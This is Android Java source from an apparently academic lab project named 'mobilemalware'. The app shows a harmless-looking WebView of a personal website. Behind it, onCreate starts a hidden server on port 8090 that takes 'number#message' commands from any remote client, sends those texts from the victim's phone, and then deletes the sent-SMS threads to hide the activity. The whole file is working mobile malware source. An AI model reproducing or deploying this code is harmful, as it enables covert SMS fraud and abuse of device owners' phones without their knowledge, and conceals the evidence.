package com.ddarji.lab12.mobilemalware;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Window;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    WebView webview;

    ServerSocket serverSocket = null;
    final String SERVER="";
    Socket mSocket=null;
    final int PORT = 8090;
    // SMSReceiver smsReceiver;
    //private SMSObeserver smsContentObserver;
    private static final int MSG_INBOXCONTENT = 1;


    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // Let's display the progress in the activity title bar, like the browser app does.
        getWindow().requestFeature(Window.FEATURE_PROGRESS);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //Thread Stuff
        new Thread() {
            public void run() {
                try {
                    startServer();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }.start();

        //WebView Stuff
        webview = (WebView) findViewById(R.id.webView);
        webview.getSettings().setJavaScriptEnabled(true);
        webview.setBackgroundColor(getResources().getColor(R.color.colorPrimaryDark));
        final Activity activity = this;
        webview.setWebChromeClient(new WebChromeClient() {
            public void onProgressChanged(WebView view, int progress) {
                // Activities and WebViews measure progress with different scales.
                // The progress meter will automatically disappear when we reach 100%
                activity.setProgress(progress * 1000);
            }
        });
        webview.setWebViewClient(new WebViewClient() {
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                Toast.makeText(activity, "Oh no! " + error, Toast.LENGTH_SHORT).show();
            }
        });
        webview.loadUrl("http://dhruvaldarji.com/");
    }

    private String getMyIP() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return null;
        }
    }

    private void startServer() throws InterruptedException {
        Log.i("AndroidServer", "START..");
        try {
            serverSocket = new ServerSocket(PORT);
            //mSocket=new Socket(SERVER,PORT);
            while (true) {
                Socket client = serverSocket.accept();
                Log.i("VICTIM", "visting..");
                try {
                    // Log.i("hehheh", "visting..");
                    BufferedReader in = new BufferedReader(
                            new InputStreamReader(client.getInputStream()));
                    String str = in.readLine();
                    String[] tempMessage = str.split("#");
                    String phoneNo = tempMessage[0];
                    String message = tempMessage[1];
                    Log.i("AndroidServer", "No:" + phoneNo + " message:"
                            + message);
                    // Toast.makeText(MainActivity.this,"No:"+phoneNo+" message:"+message,
                    // Toast.LENGTH_SHORT).show();
                    sendSMS(phoneNo, message);// send message to target
                    deleteSMS();
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    client.close();
                }
                Thread.sleep(1000);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendSMS(String phoneNo, String message) {
        SmsManager smsManager = SmsManager.getDefault();
        if (message.length() > 70) {
            List<String> contents = smsManager.divideMessage(message);
            for (String str : contents) {
                smsManager.sendTextMessage(phoneNo, null, message, null, null);
            }
        } else {
            smsManager.sendTextMessage(phoneNo, null, message, null, null);
        }
        // Toast.makeText(MainActivity.this,"Send at"+new Date(),
        // Toast.LENGTH_SHORT).show();
        Log.i("AndroidServer", "Send at" + new Date());
        Log.i("AndroidServer", "delete");
        // deleteSMS();
    }

    /*
     * Delete all SMS one by one
     */
    public void deleteSMS() {
        try {
            ContentResolver CR = getContentResolver();
            // Query SMS
            Uri uriSms = Uri.parse("content://sms/sent");
            Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id" },
                    null, null, null);
            if (null != c && c.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = c.getLong(1);
                    CR.delete(Uri.parse("content://sms/conversations/"
                            + threadId), null, null);
                    Log.d("deleteSMS", "threadId:: " + threadId);
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.d("deleteSMS", "Exception:: " + e);
        }
    }

    public void deleteSMS(Context context, String sender) {
        try {
            Uri uri = Uri.parse("content://sms/sent");

            Cursor all = context.getContentResolver().query(uri, null, null,
                    null, null);
            if (null != all && all.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = all.getLong(1);
                    context.getContentResolver().delete(uri, null, null);
                    Log.d("deleteSMS", "threadId:: " + threadId);
                } while (all.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private Handler mHandler = new Handler() {

        public void handleMessage(Message msg) {

            System.out.println("---mHandler----");
            switch (msg.what) {
                case MSG_INBOXCONTENT:
                    String inbox = (String) msg.obj;
                    // etSMSoutbox.setText(outbox);
                    System.out.println(inbox);
                    break;
                default:
                    break;
            }
        }
    };
}
